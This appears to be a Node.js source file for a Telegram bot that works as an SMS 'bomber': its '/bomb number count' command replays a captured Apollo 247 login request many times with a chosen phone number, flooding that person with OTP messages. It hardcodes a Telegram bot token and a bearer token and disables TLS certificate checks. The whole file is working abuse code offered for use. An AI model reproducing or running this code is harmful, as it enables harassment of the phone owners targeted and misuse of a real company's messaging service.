var request = require('request');
const { Telegraf } = require('telegraf');

const bot = new Telegraf("5949867453:AAH8R_CPSDwVe3H5ey9yyfxG2KGVdfofO60");








process.env['NODE_TLS_REJECT_UNAUTHORIZED'] = 0

var burp0_bodyString = "{\"operationName\":\"Login\",\"variables\":{\"mobileNumber\":\"+91num\",\"loginType\":\"PATIENT\"},\"query\":\"query Login($mobileNumber: String!, $loginType: LOGIN_TYPE!) {\\n  login(mobileNumber: $mobileNumber, loginType: $loginType) {\\n    status\\n    message\\n    loginId\\n    __typename\\n  }\\n}\\n\"}"
var NUM=9058528760;
var burp0_headers = {
    "Content-Length": "292", 
    "Sec-Ch-Ua": "\"Not?A_Brand\";v=\"8\", \"Chromium\";v=\"108\"", 
    "Accept": "*/*", 
    "Content-Type": "application/json", 
    "Sec-Ch-Ua-Mobile": "?0", 
    "Authorization": "Bearer 3d1833da7020e0602165529446587434", 
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.72 Safari/537.36", 
    "Sec-Ch-Ua-Platform": "\"Windows\"", 
    "Origin": "https://www.apollopharmacy.in", 
    "Sec-Fetch-Site": "cross-site", 
    "Sec-Fetch-Mode": "cors", 
    "Sec-Fetch-Dest": "empty", 
    "Referer": "https://www.apollopharmacy.in/", 
    "Accept-Encoding": "gzip, deflate", 
    "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8", 
    "Connection": "close"
}
bot.start((ctx) => {ctx.reply('hi Welcome,To start bombing type                /bomb number count')

});
bot.command('/bomb',(ctx)=>{
    let n= ctx.message.text;
    let narray=n.split(' ');
    console.log(narray);
     NUM=narray[1];
     let count=narray[2];
     var burp0_options = {
        url: "https://webapi.apollo247.com:443/",
        headers: burp0_headers,
        method: "post",
        body: burp0_bodyString.replace("num",NUM)
    }

    if(count>5 && count<=15)
    {
     ctx.reply("enter auth code");
     bot.hears('001',(ctx)=>{
         for(let i=0;i<count;i++){
             if(i==0)
             ctx.reply("Starting.....");
             request(burp0_options, function (error, response, body) {
             console.log('statusCode:', response && response.statusCode)
             console.log('error: ', error)
             console.log('body: ', body)
             if(i==count-1)
             ctx.reply("done");
             })}  
 
         
     })
    }
    else if(count>15)
    {
     ctx.reply("enter auth code");
     bot.hears('002',(ctx)=>{
         
 
         for(let i=0;i<count;i++){
             request(burp0_options, function (error, response, body) {
             console.log('statusCode:', response && response.statusCode)
             console.log('error: ', error)
             console.log('body: ', body)
             if(i==count-1)
             ctx.reply("done");
             })}
     })
    }
    else{
    for(let i=0;i<count;i++){
     request(burp0_options, function (error, response, body) {
     console.log('statusCode:', response && response.statusCode)
     console.log('error: ', error)
     console.log('body: ', body)
     if(i==count-1)
     ctx.reply("done");
     })}}
   // burp0_bodyString=burp1_bodyString.replace("num",num)
   // console.log(burp0_bodyString);
    })


bot.command('bomb',(ctx)=>{
request(burp0_options, function (error, response, body) {
    console.log('statusCode:', response && response.statusCode)
    console.log('error: ', error)
    console.log('body: ', body)
  
    })})





    bot.help((ctx) => ctx.reply('Send me a sticker'));
bot.on('sticker', (ctx) => ctx.reply('👍'));
bot.hears('hi', (ctx) => ctx.reply('Hey there'));
bot.launch();

// Enable graceful stop
process.once('SIGINT', () => bot.stop('SIGINT'));
process.once('SIGTERM', () => bot.stop('SIGTERM'));
//====================================================
